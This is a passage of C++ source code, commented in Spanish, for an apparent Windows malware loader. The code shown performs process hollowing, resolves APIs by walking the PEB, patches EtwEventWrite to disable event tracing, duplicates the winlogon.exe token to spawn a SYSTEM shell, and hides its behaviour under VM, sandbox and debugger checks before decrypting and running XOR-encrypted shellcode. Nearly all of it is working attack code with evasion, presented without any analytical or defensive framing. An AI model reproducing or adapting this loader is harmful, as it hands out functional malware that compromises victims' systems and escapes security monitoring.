    
    // Verificar la firma PE
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "Invalid PE signature (0x" << std::hex << pNtHeaders->Signature << ")" << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(pDosHeader);
        free(pNtHeaders);
        return false;
    }
    
    // Obtener el tamaño de la imagen del proceso original
    DWORD imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    std::cout << "Tamaño de la imagen original: " << std::dec << imageSize << " bytes" << std::endl;
    
    LPVOID pNewImageBase = NULL;
    DWORD oldProtect;
    
    // Intentar cambiar los permisos de la memoria existente
    if (VirtualProtectEx(pi.hProcess, imageBaseAddress, imageSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cout << "Permisos de memoria cambiados exitosamente" << std::endl;
        pNewImageBase = imageBaseAddress;
    } else {
        DWORD error = GetLastError();
        std::cerr << "VirtualProtectEx failed: " << error << std::endl;
        
        // Si no podemos cambiar los permisos, intentamos liberar y reasignar
        if (!VirtualFreeEx(pi.hProcess, imageBaseAddress, 0, MEM_RELEASE)) {
            error = GetLastError();
            std::cerr << "VirtualFreeEx (release) failed: " << error << std::endl;
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            free(pDosHeader);
            free(pNtHeaders);
            return false;
        }
        
        std::cout << "Memoria original liberada exitosamente" << std::endl;
        
        // Asignar nueva memoria para el shellcode
        pNewImageBase = VirtualAllocEx(
            pi.hProcess,
            imageBaseAddress,  // Intentar asignar en la misma dirección
            shellcodeSize,     // Solo el tamaño necesario para el shellcode
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        
        if (!pNewImageBase) {
            // Si no podemos asignar en la dirección base, intentamos en cualquier dirección
            pNewImageBase = VirtualAllocEx(
                pi.hProcess,
                NULL,           // Dejar que el sistema elija
                shellcodeSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
            
            if (!pNewImageBase) {
                std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
                TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                free(pDosHeader);
                free(pNtHeaders);
                return false;
            }
        }
        std::cout << "Nueva memoria asignada en: " << pNewImageBase << std::endl;
    }
    
    // Desencriptar el shellcode antes de inyectarlo
    unsigned char* decryptedShellcode = new unsigned char[shellcodeSize];
    memcpy(decryptedShellcode, shellcode, shellcodeSize);
    XorCrypt(decryptedShellcode, shellcodeSize, encryptionKey, sizeof(encryptionKey));
    
    // Imprimir primeros bytes del shellcode para depuración
    std::cout << "Primeros bytes del shellcode desencriptado: ";
    for (int i = 0; i < 20 && i < shellcodeSize; i++) {
        printf("%02x ", decryptedShellcode[i]);
    }
    std::cout << std::endl;
    
    // Escribir el shellcode en la memoria del proceso
    if (!WriteProcessMemory(pi.hProcess, pNewImageBase, decryptedShellcode, shellcodeSize, NULL)) {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(pDosHeader);
        free(pNtHeaders);
        delete[] decryptedShellcode;
        return false;
    }
    
    std::cout << "Shellcode escrito en el proceso" << std::endl;
    
    // Obtener el contexto del hilo principal
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &context)) {
        std::cerr << "GetThreadContext failed: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(pDosHeader);
        free(pNtHeaders);
        delete[] decryptedShellcode;
        return false;
    }
    
    // Establecer correctamente el punto de entrada
#ifdef _WIN64
    context.Rcx = (DWORD64)pNewImageBase;
    std::cout << "Estableciendo punto de entrada (Rcx) en: 0x" << std::hex << context.Rcx << std::endl;
#else
    context.Eax = (DWORD)pNewImageBase;
    std::cout << "Estableciendo punto de entrada (Eax) en: 0x" << std::hex << context.Eax << std::endl;
#endif
    
    // Actualizar el contexto del hilo
    if (!SetThreadContext(pi.hThread, &context)) {
        std::cerr << "SetThreadContext failed: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(pDosHeader);
        free(pNtHeaders);
        delete[] decryptedShellcode;
        return false;
    }
    
    std::cout << "Contexto del hilo actualizado" << std::endl;
    
    // Reanudar la ejecución del proceso
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        std::cerr << "ResumeThread failed: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(pDosHeader);
        free(pNtHeaders);
        delete[] decryptedShellcode;
        return false;
    }
    
    std::cout << "Proceso reanudado. Process Hollowing completado exitosamente." << std::endl;
    
    // Liberar recursos
    free(pDosHeader);
    free(pNtHeaders);
    delete[] decryptedShellcode;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return true;
}

// Funcion para imprimir bytes en hexadecimal
void PrintHex(const unsigned char* data, size_t size, const char* label) {
    std::cout << label << ": ";
    for (size_t i = 0; i < (size > 16 ? 16 : size); i++) {
        printf("%02x ", data[i]);
    }
    std::cout << std::endl;
}

HMODULE GetModuleBaseAddress(const char* moduleName) {
    printf("Buscando modulo: %s\n", moduleName);
    
    // Obtener el PEB del proceso actual
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif

    if (!peb || !peb->Ldr) {
        printf("PEB o LDR inválido\n");
        return NULL;
    }

    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* listHead = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current = listHead->Flink;

    while (current != listHead) {
        // Obtener la entrada del modulo actual
        PLDR_DATA_TABLE_ENTRY moduleEntry = (PLDR_DATA_TABLE_ENTRY)((BYTE*)current - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
        
        if (!moduleEntry || !moduleEntry->FullDllName.Buffer || moduleEntry->FullDllName.Length == 0) {
            current = current->Flink;
            continue;
        }

        // Convertir el nombre del modulo a ANSI
        char dllName[MAX_PATH];
        size_t convertedChars;
        if (wcstombs_s(&convertedChars, dllName, sizeof(dllName), moduleEntry->FullDllName.Buffer, _TRUNCATE) != 0) {
            current = current->Flink;
            continue;
        }

        // Extraer solo el nombre del archivo (sin ruta)
        char* fileName = strrchr(dllName, '\\');
        if (fileName) {
            fileName++; // Saltar el '\'
        } else {
            fileName = dllName;
        }

        // Convertir a minúsculas para comparacion insensible a mayúsculas/minúsculas
        for (int i = 0; fileName[i]; i++) {
            fileName[i] = tolower(fileName[i]);
        }

        // Convertir el nombre de búsqueda a minúsculas
        char searchName[MAX_PATH];
        strcpy_s(searchName, sizeof(searchName), moduleName);
        for (int i = 0; searchName[i]; i++) {
            searchName[i] = tolower(searchName[i]);
        }

        // Comparar nombres
        if (strcmp(fileName, searchName) == 0) {
            printf("Modulo encontrado con PEB: %s (Base: 0x%p)\n", fileName, moduleEntry->DllBase);
            return (HMODULE)moduleEntry->DllBase;
        }

        current = current->Flink;
    }

    // Si no se encontro el modulo, intentar cargarlo dinámicamente
    //printf("Modulo no encontrado en PEB, intentando cargar dinámicamente...\n");
    
    // Usar la API de Windows para cargar la biblioteca
    //HMODULE hModule = LoadLibraryA(moduleName);
    //if (hModule) {
        //printf("Modulo cargado dinámicamente: %s (Base: 0x%p)\n", moduleName, hModule);
       // return hModule;
    //}
    
    printf("No se pudo cargar el modulo: %s\n", moduleName);
    return NULL;
}


// Funcion para obtener la direccion de una funcion exportada por un modulo sin usar GetProcAddress
FARPROC GetProcAddressHidden(HMODULE moduleBase, const char* functionName) {
    printf("Resolviendo funcion: %s\n", functionName);
    
    if (!moduleBase || !functionName) {
        printf("Error: moduleBase o functionName es NULL\n");
        return NULL;
    }
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Error: Firma DOS invalida\n");
        return NULL;
    }
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Error: Firma PE invalida\n");
        return NULL;
    }
    
    DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportDirRva) {
        printf("Error: No hay directorio de exportacion\n");
        return NULL;
    }
    
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)moduleBase + exportDirRva);
    PDWORD functionsRva = (PDWORD)((DWORD_PTR)moduleBase + exportDir->AddressOfFunctions);
    PDWORD namesRva = (PDWORD)((DWORD_PTR)moduleBase + exportDir->AddressOfNames);
    PWORD ordinals = (PWORD)((DWORD_PTR)moduleBase + exportDir->AddressOfNameOrdinals);
    
    printf("Buscando en %d funciones exportadas...\n", exportDir->NumberOfNames);
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionNamePtr = (char*)((DWORD_PTR)moduleBase + namesRva[i]);
        if (strcmp(functionNamePtr, functionName) == 0) {
            DWORD functionRva = functionsRva[ordinals[i]];
            FARPROC result = (FARPROC)((DWORD_PTR)moduleBase + functionRva);
            printf("Funcion encontrada: %s en 0x%p\n", functionName, result);
            return result;
        }
    }
    
    printf("Funcion no encontrada: %s\n", functionName);
    return NULL;
}

// Funcion para inicializar las direcciones de las APIs
bool InitializeAPIs() {
    // Obtener la dirección base de kernel32.dll
    HMODULE kernel32Base = GetModuleBaseAddress("kernel32.dll");
    if (!kernel32Base) {
        std::cerr << "Kernel32 no encontrado" << std::endl;
        return false;
    }
    
    // Obtener la dirección base de user32.dll
    //HMODULE user32Base = GetModuleBaseAddress("user32.dll");
    //if (!user32Base) {
        //std::cerr << "User32 no encontrado" << std::endl;
        //return false;
    //}
    
    // Obtener la dirección base de ntdll.dll
    HMODULE ntdllBase = GetModuleBaseAddress("ntdll.dll");
    if (!ntdllBase) {
        std::cerr << "Ntdll no encontrado" << std::endl;
        return false;
    }

    HMODULE advapi32Base = GetModuleBaseAddress("advapi32.dll");
    if (!advapi32Base){
        std::cerr << "advapi32.dll no encontrado" << std::endl;
        return false;
    }
    
    std::cout << "Modulos base obtenidos correctamente" << std::endl;
    
    // Resolver las APIs de kernel32.dll
    // Usamos una variable temporal para el nombre descifrado para evitar problemas de conversión
    const char* loadLibraryAName ="LoadLibraryA";
    APIs.LoadLibraryA = (HMODULE(WINAPI*)(LPCSTR))GetProcAddressHidden(kernel32Base, loadLibraryAName);
    
    const char* getProcAddressName ="GetProcAddress";
    APIs.GetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR))GetProcAddressHidden(kernel32Base, getProcAddressName);
    
    const char* virtualAllocName ="VirtualAlloc";
    APIs.VirtualAlloc = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddressHidden(kernel32Base, virtualAllocName);
    
    const char* virtualProtectName ="VirtualProtect";
    APIs.VirtualProtect = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))GetProcAddressHidden(kernel32Base, virtualProtectName);
    
    const char* createThreadName ="CreateThread";
    APIs.CreateThread = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddressHidden(kernel32Base, createThreadName);
    
    const char* waitForSingleObjectName ="WaitForSingleObject";
    APIs.WaitForSingleObject = (DWORD(WINAPI*)(HANDLE, DWORD))GetProcAddressHidden(kernel32Base, waitForSingleObjectName);
    
    const char* closeHandleName ="CloseHandle";
    APIs.CloseHandle = (BOOL(WINAPI*)(HANDLE))GetProcAddressHidden(kernel32Base, closeHandleName);
    
    const char* createToolhelp32SnapshotName ="CreateToolhelp32Snapshot";
    APIs.CreateToolhelp32Snapshot = (HANDLE(WINAPI*)(DWORD, DWORD))GetProcAddressHidden(kernel32Base, createToolhelp32SnapshotName);
    
    const char* process32FirstName ="Process32First";
    APIs.Process32First = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))GetProcAddressHidden(kernel32Base, process32FirstName);
    
    const char* process32NextName ="Process32Next";
    APIs.Process32Next = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))GetProcAddressHidden(kernel32Base, process32NextName);
    
    const char* openProcessName ="OpenProcess";
    APIs.OpenProcess = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))GetProcAddressHidden(kernel32Base, openProcessName);
    
    const char* virtualAllocExName ="VirtualAllocEx";
    APIs.VirtualAllocEx = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddressHidden(kernel32Base, virtualAllocExName);
    
    const char* writeProcessMemoryName ="WriteProcessMemory";
    APIs.WriteProcessMemory = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddressHidden(kernel32Base, writeProcessMemoryName);
    
    const char* createRemoteThreadName ="CreateRemoteThread";
    APIs.CreateRemoteThread = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddressHidden(kernel32Base, createRemoteThreadName);
    
    const char* virtualFreeExName ="VirtualFreeEx";
    APIs.VirtualFreeEx = (BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD))GetProcAddressHidden(kernel32Base, virtualFreeExName);
    
    const char* getSystemInfoName ="GetSystemInfo";
    APIs.GetSystemInfo = (VOID(WINAPI*)(LPSYSTEM_INFO))GetProcAddressHidden(kernel32Base, getSystemInfoName);
    
    const char* globalMemoryStatusExName ="GlobalMemoryStatusEx";
    APIs.GlobalMemoryStatusEx = (BOOL(WINAPI*)(LPMEMORYSTATUSEX))GetProcAddressHidden(kernel32Base, globalMemoryStatusExName);
    
    const char* getTickCountName ="GetTickCount";
    APIs.GetTickCount = (DWORD(WINAPI*)(void))GetProcAddressHidden(kernel32Base, getTickCountName);
    
    const char* getModuleHandleAName ="GetModuleHandleA";
    APIs.GetModuleHandleA = (HMODULE(WINAPI*)(LPCSTR))GetProcAddressHidden(kernel32Base, getModuleHandleAName);
    
    const char* isDebuggerPresentName ="IsDebuggerPresent";
    APIs.IsDebuggerPresent = (BOOL(WINAPI*)(void))GetProcAddressHidden(kernel32Base, isDebuggerPresentName);
    
    const char* checkRemoteDebuggerPresentName ="CheckRemoteDebuggerPresent";
    APIs.CheckRemoteDebuggerPresent = (BOOL(WINAPI*)(HANDLE, PBOOL))GetProcAddressHidden(kernel32Base, checkRemoteDebuggerPresentName);
    
    const char* queryPerformanceCounterName ="QueryPerformanceCounter";
    APIs.QueryPerformanceCounter = (BOOL(WINAPI*)(LARGE_INTEGER*))GetProcAddressHidden(kernel32Base, queryPerformanceCounterName);
    
    const char* queryPerformanceFrequencyName ="QueryPerformanceFrequency";
    APIs.QueryPerformanceFrequency = (BOOL(WINAPI*)(LARGE_INTEGER*))GetProcAddressHidden(kernel32Base, queryPerformanceFrequencyName);
    
    const char* getLastErrorName ="GetLastError";
    APIs.GetLastError = (DWORD(WINAPI*)(void))GetProcAddressHidden(kernel32Base, getLastErrorName);
    
    const char* getExitCodeThreadName ="GetExitCodeThread";
    APIs.GetExitCodeThread = (BOOL(WINAPI*)(HANDLE, LPDWORD))GetProcAddressHidden(kernel32Base, getExitCodeThreadName);
    
    const char* virtualFreeName ="VirtualFree";
    APIs.VirtualFree = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD))GetProcAddressHidden(kernel32Base, virtualFreeName);
    
    // Nuevas APIs para Process Hollowing
    const char* createProcessAName ="CreateProcessA";
    APIs.CreateProcessA = (BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))GetProcAddressHidden(kernel32Base, createProcessAName);
    
    const char* getThreadContextName ="GetThreadContext";
    APIs.GetThreadContext = (BOOL(WINAPI*)(HANDLE, PCONTEXT))GetProcAddressHidden(kernel32Base, getThreadContextName);
    
    const char* setThreadContextName ="SetThreadContext";
    APIs.SetThreadContext = (BOOL(WINAPI*)(HANDLE, const CONTEXT*))GetProcAddressHidden(kernel32Base, setThreadContextName);
    
    const char* readProcessMemoryName ="ReadProcessMemory";
    APIs.ReadProcessMemory = (BOOL(WINAPI*)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*))GetProcAddressHidden(kernel32Base, readProcessMemoryName);
    
    const char* resumeThreadName ="ResumeThread";
    APIs.ResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddressHidden(kernel32Base, resumeThreadName);
    
    const char* terminateProcessName ="TerminateProcess";
    APIs.TerminateProcess = (BOOL(WINAPI*)(HANDLE, UINT))GetProcAddressHidden(kernel32Base, terminateProcessName);

    const char* openProcessTokenName = "OpenProcessToken";
    APIs.OpenProcessToken = (BOOL(WINAPI*)(HANDLE, DWORD, PHANDLE))GetProcAddressHidden(advapi32Base, openProcessTokenName);

    const char* duplicateTokenExName = "DuplicateTokenEx";
   APIs.DuplicateTokenEx = (BOOL(WINAPI*)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE))GetProcAddressHidden(advapi32Base, duplicateTokenExName);

   const char* createProcessWithTokenWName = "CreateProcessWithTokenW";
    APIs.CreateProcessWithTokenW = (BOOL(WINAPI*)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))GetProcAddressHidden(advapi32Base, createProcessWithTokenWName);
    
    // Resolver las APIs de user32.dll
    //const char* messageBoxAName ="MessageBoxA");
    //APIs.MessageBoxA = (int(WINAPI*)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddressHidden(user32Base, messageBoxAName);
    
    // Resolver las APIs de ntdll.dll
    const char* ntAllocateVirtualMemoryName ="NtAllocateVirtualMemory";
    APIs.NtAllocateVirtualMemory = (NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))GetProcAddressHidden(ntdllBase, ntAllocateVirtualMemoryName);
    
    const char* ntQueryInformationProcessName = "NtQueryInformationProcess";
    APIs.NtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddressHidden(ntdllBase, ntQueryInformationProcessName);

    // Verificar que todas las APIs se resolvieron correctamente
    if (!APIs.LoadLibraryA || !APIs.GetProcAddress || !APIs.VirtualAlloc || !APIs.VirtualProtect ||
        !APIs.CreateThread || !APIs.WaitForSingleObject || !APIs.CloseHandle ||
        !APIs.CreateToolhelp32Snapshot || !APIs.Process32First || !APIs.Process32Next ||
        !APIs.OpenProcess || !APIs.VirtualAllocEx || !APIs.WriteProcessMemory ||
        !APIs.CreateRemoteThread || !APIs.VirtualFreeEx || !APIs.GetSystemInfo ||
        !APIs.GlobalMemoryStatusEx || !APIs.GetTickCount || !APIs.GetModuleHandleA ||
        !APIs.IsDebuggerPresent || !APIs.CheckRemoteDebuggerPresent ||
        !APIs.QueryPerformanceCounter || !APIs.QueryPerformanceFrequency || !APIs.GetLastError ||
        !APIs.GetExitCodeThread || !APIs.VirtualFree || !APIs.NtAllocateVirtualMemory ||
        // Nuevas APIs para Process Hollowing
        !APIs.CreateProcessA || !APIs.GetThreadContext || !APIs.SetThreadContext ||
        !APIs.ReadProcessMemory || !APIs.ResumeThread || !APIs.TerminateProcess || !APIs.NtAllocateVirtualMemory ||
        !APIs.OpenProcessToken || !APIs.DuplicateTokenEx || !APIs.CreateProcessWithTokenW) {
        std::cerr << "Error al resolver una o más APIs" << std::endl;
        return false;
    }
    
    std::cout << "Todas las APIs resueltas correctamente" << std::endl;
    return true;
}

// Funcion para parchear el EtWEventWrite
bool PatchEtwEventWrite() {
    HMODULE ntdllBase = GetModuleBaseAddress("ntdll.dll");
    if (!ntdllBase) {
        std::cerr << "No se pudo obtener ntdll.dll" << std::endl;
        return false;
    }

    FARPROC pEtwEventWrite = GetProcAddressHidden(ntdllBase, "EtwEventWrite");
    if (!pEtwEventWrite) {
        std::cerr << "No se pudo obtener EtwEventWrite" << std::endl;
        return false;
    }

    // Bytes del parche: ret (0xC3)
    BYTE patch[] = { 0xC3 };

    LPVOID pEtwEventWriteVoid = reinterpret_cast<LPVOID>(pEtwEventWrite);

    DWORD oldProtect;
    if (!APIs.VirtualProtect(pEtwEventWriteVoid, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cerr << "VirtualProtect failed: " << APIs.GetLastError() << std::endl;
        return false;
    }

    BYTE originalBytes[sizeof(patch)];
    memcpy(originalBytes, pEtwEventWriteVoid, sizeof(patch));

    memcpy(pEtwEventWriteVoid, patch, sizeof(patch));

    if (!APIs.VirtualProtect(pEtwEventWriteVoid, sizeof(patch), oldProtect, &oldProtect)) {
        std::cerr << "VirtualProtect (restore) failed: " << APIs.GetLastError() << std::endl;
        return false;
    }

    std::cout << "ETW parcheado correctamente" << std::endl;
    return true;
}


// Funcion para obetener el PID de un proceso por nombre
DWORD GetPidByName(const std::wstring& name){
    PROCESSENTRY32W entry = { sizeof(entry) };
    HANDLE snapshot = APIs.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;

    if (snapshot == INVALID_HANDLE_VALUE){
        std::cerr << "CreateToolhelp32Snapshot fallo: " << APIs.GetLastError() << std::endl;
        return 0;
    }

    if (APIs.Process32First(snapshot, (LPPROCESSENTRY32)&entry)){
        do {
            if (name == entry.szExeFile){
                pid = entry.th32ProcessID;
                break;
            }
        } while (APIs.Process32Next(snapshot, (LPPROCESSENTRY32)&entry));
    }

    APIs.CloseHandle(snapshot);
    return pid;
}

// Funcion para elevacion de privilegios con token spoofing
bool ElevatePrivilegesWithToken(){
    const wchar_t* targetProcess = L"winlogon.exe";
    const wchar_t* systemCmd = L"C\\Windows\\System32\\cmd.exe";

    DWORD targetPid = GetPidByName(targetProcess);
    if (targetPid == 0){
        std::wcerr << L"No se encontro el proceso" << targetProcess << std::endl;
        return false;
    }

    HANDLE hProc = APIs.OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProc){
        std::wcerr << L"No se pudo abrir el proceso" << APIs.GetLastError() << std::endl;
        return false;
    }

    HANDLE hToken;
    if (!APIs.OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)){
        std::wcerr << L"No se pudo abrir el token: " << APIs.GetLastError() << std::endl;
        APIs.CloseHandle(hProc);
        return false; 
    }

    HANDLE hDupToken;
    if (!APIs.DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)){
        std::wcerr << L"No se pudo abrir el token: " << APIs.GetLastError() << std::endl;
        APIs.CloseHandle(hProc);
        return false;
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (APIs.CreateProcessWithTokenW(hDupToken, 0, systemCmd, NULL, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
        std::wcout << L"Shell con privilegios SYSTEM creada" << std::endl;

        APIs.CloseHandle(pi.hProcess);
        APIs.CloseHandle(pi.hThread);
        APIs.CloseHandle(hDupToken);
        APIs.CloseHandle(hToken);
        APIs.CloseHandle(hProc);

        return true;
    } else {
        std::wcerr << L"No se pudo crear el proceso: " << APIs.GetLastError() << std::endl;
        
        APIs.CloseHandle(hDupToken);
        APIs.CloseHandle(hToken);
        APIs.CloseHandle(hProc);

        return false;
    }

}

std::vector<std::wstring> GetSystemTempDirectories(){
    std::vector<std::wstring> tempDirs;
    wchar_t tempPath[MAX_PATH];

    if (GetTempPathW(MAX_PATH, tempPath)){
        tempDirs.push_back(tempPath);
    }

    GetSystemDirectoryW(tempPath, MAX_PATH);
    wcscat_s(tempPath, MAX_PATH, L"\\temp");
    tempDirs.push_back(tempPath);

    return tempDirs;
}

// Funcion principal
int main() {
    // Inicializar las APIs
    if (!InitializeAPIs()) {
        std::cout << "Error al inicializar las APIs" << std::endl;
        return 0;
    }
    
    // Inicializar semilla para números aleatorios
    srand(APIs.GetTickCount());
    
    // Verificar si estamos en un entorno de análisis
    if (IsRunningInVM() || IsRunningInSandbox() || APIs.IsDebuggerPresent() || CheckRemoteDebuggerPresent() || DetectAPIHooks()) {
        // Si estamos en un entorno de análisis, ejecutar codigo benigno
        APIs.MessageBoxA(NULL, "Hola Mundo", "Mensaje", MB_OK);
        return 0;
    }
    
    // Retraso anti-sandbox
    AntiSandboxDelay();

    if (!PatchEtwEventWrite()){
        std::cerr << "No se puedo parchear EtwEventWrite" << std::endl;
    }
    std::cout << "Se parcheo correctamente el EtwEventWrite" << std::endl;

    if (ElevatePrivilegesWithToken()){
        std::cout << "Elevacion de privilegios completada exitosamente" << std::endl;
        return 0;
    }
    
    // Calcular el tamaño real del shellcode
    const DWORD shellcodeSize = CalculateShellcodeSize();
    std::cout << "Tamaño calculado del shellcode: " << shellcodeSize << " bytes" << std::endl;
    
    std::cout << "Combinando partes" << std::endl;
    // Combinar partes del shellcode
    unsigned char* combinedShellcode = new unsigned char[shellcodeSize];
    CombineShellcode(combinedShellcode);
    
    // Imprimir primeros bytes del shellcode combinado para verificar (sin encriptar)
    std::cout << "Primeros bytes del shellcode combinado (sin encriptar): ";
    for (int i = 0; i < 20 && i < shellcodeSize; i++) {
        printf("%02x ", combinedShellcode[i]);
    }
    std::cout << std::endl;
    
    // Encriptar el shellcode combinado
    XorCrypt(combinedShellcode, shellcodeSize, encryptionKey, sizeof(encryptionKey));
    
    // Imprimir primeros bytes del shellcode encriptado para verificar
    std::cout << "Primeros bytes del shellcode encriptado: ";
    for (int i = 0; i < 20 && i < shellcodeSize; i++) {
        printf("%02x ", combinedShellcode[i]);
    }
    std::cout << std::endl;
    
    if (ProcessHollowing(combinedShellcode, shellcodeSize)){
        std::cout << "PH completado" << std::endl;
        return 0;
    }

    std::cout << "Inyectando shellcode" << std::endl;
    // Técnica de inyeccion de proceso
    if (InjectIntoProcess(combinedShellcode, shellcodeSize)) {
        std::cout << "Inyeccion completada" << std::endl;
        delete[] combinedShellcode;
        return 0;
    }
    
    std::cout << "Si fallo la inyeccion ejecutamos con memoria local" << std::endl;
    // Si falla la inyeccion, usar técnica de memoria local
    SIZE_T size = shellcodeSize;
    LPVOID memory = NULL;
    
    std::cout << "Asignando memoria con syscall" << std::endl;
    // Asignar memoria usando syscall indirecta
    NTSTATUS status = APIs.NtAllocateVirtualMemory(GetCurrentProcess(), &memory, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (status != 0) {
        std::cerr << "NtAllocateVirtualMemory failed: 0x" << std::hex << status << std::dec << std::endl;
        // Fallback a VirtualAlloc si falla la syscall
        memory = APIs.VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!memory) {
            std::cerr << "VirtualAlloc failed: " << APIs.GetLastError() << std::endl;
            delete[] combinedShellcode;
            return 1;
        }
    }
    
    std::cout << "Memoria asignada en: " << memory << std::endl;
    std::cout << "Copiando shellcode" << std::endl;
    
    // Copiar shellcode encriptado
    memcpy(memory, combinedShellcode, size);
    
    // Desencriptar el shellcode en memoria
    XorCrypt((unsigned char*)memory, size, encryptionKey, sizeof(encryptionKey));
    
    std::cout << "Cambiando los permisos" << std::endl;
    // Cambiar permisos a ejecucion
    DWORD oldProtect;
    if (!APIs.VirtualProtect(memory, size, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "VirtualProtect failed: " << APIs.GetLastError() << std::endl;
        delete[] combinedShellcode;
        return 1;
    }
    
    std::cout << "Ejecutando el shellcode" << std::endl;
    
    // Ejecutar shellcode con manejo de excepciones
    ((void(*)())memory)();
    
    std::cout << "Shellcode ejecutado correctamente" << std::endl;
    
    delete[] combinedShellcode;
    return 0;
}